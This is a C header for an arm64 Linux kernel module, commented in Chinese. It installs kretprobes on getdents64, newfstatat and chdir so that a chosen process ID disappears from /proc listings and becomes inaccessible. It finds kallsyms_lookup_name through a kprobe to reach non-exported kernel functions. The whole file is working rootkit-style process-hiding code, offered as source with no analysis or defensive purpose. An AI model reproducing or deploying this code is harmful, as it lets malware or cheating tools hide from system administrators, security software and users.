#ifndef _HOOK_H_
#define _HOOK_H_

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/sched.h>
#include <asm/barrier.h>
#include "utils.h"

/* 全局隐藏 PID（由 dream.c 的 OP_CMD_HIDE 设置） */
extern atomic_t target_hide_pid;

#define UNTAG_ADDR(addr) ((addr) & 0x00ffffffffffffffUL)

#if !defined(__nocfi)
#define __nocfi __attribute__((no_sanitize("cfi")))
#endif

/* ---------- 内部类型及函数指针 ---------- */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
typedef long (*copy_from_user_nofault_t)(void *dst, const void __user *src, size_t size);
typedef long (*copy_to_user_nofault_t)(void __user *dst, const void *src, size_t size);

static kallsyms_lookup_name_t p_kallsyms_lookup_name;
static copy_from_user_nofault_t p_copy_from_user_nofault;
static copy_to_user_nofault_t p_copy_to_user_nofault;

/* ---------- kretprobe 私有数据 ---------- */
struct gd_data {
	void __user *d;
	int pid;		/* entry 时快照 */
};

struct path_data {
	int hit;
	int pid;		/* entry 时快照 */
};

/* ---------- 符号解析 ---------- */
static inline unsigned long get_kallsyms_addr(void)
{
	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

/* ---------- 字符串安全读取 ---------- */
static int __nocfi safe_get_path_string(char *dst, unsigned long user_addr,
					size_t max_len)
{
	long ret;
	void __user *ptr = (void __user *)UNTAG_ADDR(user_addr);

	if (!p_copy_from_user_nofault)
		return -1;
	ret = p_copy_from_user_nofault(dst, ptr, max_len);
	if (ret != 0)
		return -1;
	dst[max_len - 1] = '\0';
	return 0;
}

/* ---------- 判断路径是否指向隐藏 PID 的 /proc 目录 ---------- */
static int is_target_path_pid(const char *path, int pid)
{
	char target[32];
	int len;

	if (pid <= 0)
		return 0;

	/* 格式 /proc/PID */
	snprintf(target, sizeof(target), "/proc/%d", pid);
	len = strlen(target);

	/* 必须完全匹配目录前缀：path 等于 "/proc/PID" 或以 "/proc/PID/" 开头 */
	if (strncmp(path, target, len) != 0)
		return 0;
	if (path[len] == '\0' || path[len] == '/')
		return 1;

	return 0;
}

/* ===================================================================
 * getdents64 钩子：隐藏目标 PID 的目录项
 * =================================================================== */
static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_data *d = (void *)ri->data;
	struct pt_regs *user_regs = get_user_regs(regs);

	/* 一次快照整个 PID，ret 端直接使用，无需再读全局变量 */
	d->pid = atomic_read(&target_hide_pid);
	d->d = (void __user *)UNTAG_ADDR(user_regs->regs[1]);
	return 0;
}

static int __nocfi gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gd_data *d = (void *)ri->data;
	struct linux_dirent64 *b, *e;
	char s[16];
	long r, o;
	int pid = d->pid;

	r = regs->regs[0];
	if (pid <= 0 || r <= 0)
		return 0;

	snprintf(s, sizeof(s), "%d", pid);

	b = kvmalloc(r, GFP_KERNEL);
	if (!b)
		return 0;

	if (p_copy_from_user_nofault(b, d->d, r) != 0)
		goto out;

	for (o = 0; o < r; ) {
		e = (void *)b + o;

		/* 安全检查：d_reclen 不能为 0 或溢出 */
		if (e->d_reclen == 0 || e->d_reclen > (unsigned short)(r - o))
			break;

		if (!strcmp(e->d_name, s)) {
			long remaining = r - o - e->d_reclen;
			if (remaining > 0)
				memmove(e, (char *)e + e->d_reclen, remaining);
			r -= e->d_reclen;
			/* o 不动，因为新条目已移到当前位置 */
		} else {
			o += e->d_reclen;
		}
	}

	if (p_copy_to_user_nofault(d->d, b, r) == 0)
		regs->regs[0] = r;

out:
	kvfree(b);
	return 0;
}

/* ===================================================================
 * stat / chdir 路径钩子：拒绝访问 /proc/隐藏PID
 * =================================================================== */
static int stat_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct path_data *d = (void *)ri->data;
	struct pt_regs *user_regs = get_user_regs(regs);
	char path[64];

	d->hit = 0;
	d->pid = atomic_read(&target_hide_pid);

	if (d->pid <= 0)
		return 0;

	if (safe_get_path_string(path, user_regs->regs[1], sizeof(path)) == 0 &&
	    is_target_path_pid(path, d->pid))
		d->hit = 1;

	return 0;
}

static int chdir_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct path_data *d = (void *)ri->data;
	struct pt_regs *user_regs = get_user_regs(regs);
	char path[64];

	d->hit = 0;
	d->pid = atomic_read(&target_hide_pid);

	if (d->pid <= 0)
		return 0;

	if (safe_get_path_string(path, user_regs->regs[0], sizeof(path)) == 0 &&
	    is_target_path_pid(path, d->pid))
		d->hit = 1;

	return 0;
}

/* 两个路径钩子共用同一个 ret handler */
static int path_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct path_data *d = (void *)ri->data;
	if (d->hit)
		regs->regs[0] = -ENOENT;
	return 0;
}

/* ===================================================================
 * kretprobe 结构定义
 * =================================================================== */
static struct kretprobe krp_gd = {
	.handler	= gd_ret,
	.entry_handler	= gd_entry,
	.data_size	= sizeof(struct gd_data),
	.maxactive	= 20,
	.kp.symbol_name = "__arm64_sys_getdents64",
};

static struct kretprobe krp_stat = {
	.handler	= path_ret,
	.entry_handler	= stat_entry,
	.data_size	= sizeof(struct path_data),
	.maxactive	= 20,
	.kp.symbol_name = "__arm64_sys_newfstatat",
};

static struct kretprobe krp_chdir = {
	.handler	= path_ret,
	.entry_handler	= chdir_entry,
	.data_size	= sizeof(struct path_data),
	.maxactive	= 5,
	.kp.symbol_name = "__arm64_sys_chdir",
};

/* ===================================================================
 * 安装/卸载函数
 * =================================================================== */
static inline int setup_hook(void)
{
	unsigned long addr = get_kallsyms_addr();
	if (!addr)
		return -1;

	p_kallsyms_lookup_name = (kallsyms_lookup_name_t)addr;
	p_copy_from_user_nofault = (copy_from_user_nofault_t)
		p_kallsyms_lookup_name("copy_from_user_nofault");
	p_copy_to_user_nofault = (copy_to_user_nofault_t)
		p_kallsyms_lookup_name("copy_to_user_nofault");

	if (!p_copy_from_user_nofault || !p_copy_to_user_nofault)
		return -1;

	register_kretprobe(&krp_gd);
	register_kretprobe(&krp_stat);
	register_kretprobe(&krp_chdir);

	return 0;
}

static inline void uninstall_hook(void)
{
	unregister_kretprobe(&krp_gd);
	unregister_kretprobe(&krp_stat);
	unregister_kretprobe(&krp_chdir);
}

#endif /* _HOOK_H_ */